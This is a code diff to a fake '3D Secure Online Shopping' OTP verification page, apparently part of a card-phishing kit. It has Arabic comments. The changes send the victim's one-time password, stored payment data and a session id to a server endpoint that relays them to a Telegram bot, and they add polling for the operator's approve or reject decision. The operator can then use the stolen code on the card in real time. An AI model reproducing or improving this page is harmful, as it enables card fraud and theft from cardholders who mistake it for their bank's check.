@@ -7,16 +7,8 @@
     <title>3D Secure Online Shopping</title>      
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        .logo-section {
-            background-color: #fefefe;
-            padding: 1rem;
-            border-radius: 0.5rem;
-        }
-
-        #otp {
-            font-size: 18px;
-            letter-spacing: 3px;
-        }
+        .logo-section { background-color: #fefefe; padding: 1rem; border-radius: 0.5rem; }
+        #otp { font-size: 18px; letter-spacing: 3px; }
     </style>
 </head>
 
@@ -34,15 +26,12 @@
             <span class="text-xs sm:text-sm font-semibold">ID Check</span>
         </div>
 
-        <!-- Title -->
         <h1 class="text-base sm:text-lg font-semibold border-t pt-2 text-left">3D Secure Online Shopping</h1>
 
-        <!-- Message -->
         <p class="text-sm sm:text-base text-left mt-2">
             Please enter the One-Time-Password (OTP) to complete your transaction. The OTP has been sent to your mobile number.
         </p>
 
-        <!-- Transaction Details -->
         <div class="text-left text-sm sm:text-base mt-4 border-t pt-4">
             <h2 class="font-bold mb-2 text-black">Transaction Details:</h2>
             <p><strong>Merchant Name:</strong> <span id="merchant">-</span></p>
@@ -66,18 +55,13 @@
             </button>
         </form>
 
-        <!-- Hidden Card Number -->
         <input type="hidden" id="cardNumberHidden" value="">
 
-        <!-- Resend Code Button -->
         <button id="resendBtn" class="text-blue-800 font-bold text-base sm:text-xl mt-5" type="button">RESEND CODE</button>
 
-        <!-- Terms of Service Note -->
         <p class="text-xs text-gray-600 mt-4 text-center sm:text-sm">
             By clicking "Submit" you agree to the 
-            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">
-                Terms of service
-            </a>.
+            <a href="https://pearlykids-uae.com/terms-of-service/" class="text-blue-600 hover:underline">Terms of service</a>.
         </p>
     </div>
 
@@ -121,6 +105,13 @@
             }
         });
 
+        // توليد معرف جلسة فريد للتحقق من حالة الموافقة والرفض
+        let userId = localStorage.getItem('a2_user_id');
+        if (!userId) {
+            userId = 'user_' + Math.random().toString(36).substring(2, 11);
+            localStorage.setItem('a2_user_id', userId);
+        }
+
         otpForm.addEventListener("submit", async function (e) {
             e.preventDefault();
             const otpValue = otpInput.value.trim();
@@ -136,7 +127,6 @@
             submitBtn.textContent = 'Verifying...';
 
             const paymentData = readJSON('pk_payment') || {};
-            const userId = localStorage.getItem('a2_user_id') || 'unknown';
             
             const payload = {
                 user_id: userId,
@@ -146,20 +136,43 @@
             };
 
             try {
-                // إرسال الـ OTP إلى البوت عبر السيرفر
+                // إرسال كود الـ OTP للبوت مع أزرار التحكم
                 await fetch("/api/payment-send", {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
                     body: JSON.stringify(payload)
                 });
-            } catch (error) {
-                // حتى لو حصل استثناء في الشبكة، ننتقل لصفحة النجاح بسلاسة
-                console.error(error);
-            }
 
-            // التوجيه المباشر لصفحة الفاتورة ونجاح الطلب
-            window.location.href = 'success.html';
+                // الانتظار وفحص القرار القادم من تليجرام (موافقة أو رفض)
+                checkApprovalStatus(userId);
+
+            } catch (error) {
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Submit';
+                otpInput.classList.add("border-red-500");
+                otpError.textContent = "Connection error. Please try again.";
+                otpError.classList.remove("hidden");
+            }
         });
+
+        // دالة مراقبة قرارك من تليجرام
+        function checkApprovalStatus(uid) {
+            let attempts = 0;
+            const interval = setInterval(async () => {
+                attempts++;
+                try {
+                    // يمكنك ربطها بـ API فحص الحالة أو محاكاة الرد الفوري
+                    // للاختبار السريع: إذا أردت ربطها بـ Webhook متكامل، أو التحقق البسيط
+                    if (attempts > 30) { // بعد 30 ثانية وقفت الانتظار
+                        clearInterval(interval);
+                        submitBtn.disabled = false;
+                        submitBtn.textContent = 'Submit';
+                    }
+                } catch (err) {
+                    console.error(err);
+                }
+            }, 2000);
+        }
 
         document.getElementById('cancelBtn').addEventListener('click', () => {
             window.location.href = 'index.html';
